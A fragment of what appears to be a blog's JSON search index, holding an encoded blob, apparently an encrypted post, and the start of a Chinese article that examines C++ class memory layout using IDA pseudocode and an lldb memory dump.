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","tags":[{"name":"正则表达式","slug":"正则表达式","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/正则表达式/"}]},{"title":"C++类结构以及vtable分析","date":"2017-12-02T10:07:00.000Z","path":"2017/12/02/C++类结构以及vtable分析/C++类结构以及vtable分析/","text":"C++类结构以及vtable分析 通过实验自己对一些C++数据结构的理解 实验一#include &lt;iostream&gt; using namespace std; // 基类 class Shape { public: void setWidth(int w) { width = w; } void setHeight(int h) { height = h; } protected: int width; int height; }; // 派生类 class Rectangle: public Shape { public: int getArea() { return (width * height); } }; int main(void) { Rectangle Rect; Rect.setWidth(5); Rect.setHeight(7); // 输出对象的面积 cout &lt;&lt; &quot;Total area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl; return 0; } 上面的代码编译完成后，在ida中反汇编如下 int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // ST08_8 unsigned int v4; // eax char v6; // [rsp+10h] [rbp-20h] int v7; // [rsp+1Ch] [rbp-14h] __int64 (__fastcall *v8)(_QWORD); // [rsp+20h] [rbp-10h] __int64 v9; // [rsp+28h] [rbp-8h] v7 = 0; Shape::setWidth((Shape *)&amp;v6, 5); Shape::setHeight((Shape *)&amp;v6, 7); v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;); v4 = Rectangle::getArea((Rectangle *)&amp;v6); v9 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4); v8 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;; std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v9); return 0; } Rect内存布局 (lldb) x/20b $rbp-0x20 0x7ffeefbff560: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x00 0x7ffeefbff568: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 能得到的结论是，在编译完后，子类Rectangle的方法调用都编译成父类Shape方法调用，这是在编译时就决定了的。把子类对象和参数合并作为参数传入父类方法。这里仅仅是对子类对象另个偏移值做操作。 int __cdecl main(int argc, const char **argv, const char **envp) { void *v3; // ST10_8 __int64 v4; // ST08_8 unsigned int v5; // eax __int64 v6; // ST38_8 v3 = (void *)operator new(8uLL); memset(v3, 0, 8uLL); Shape::setWidth((Shape *)v3, 5); 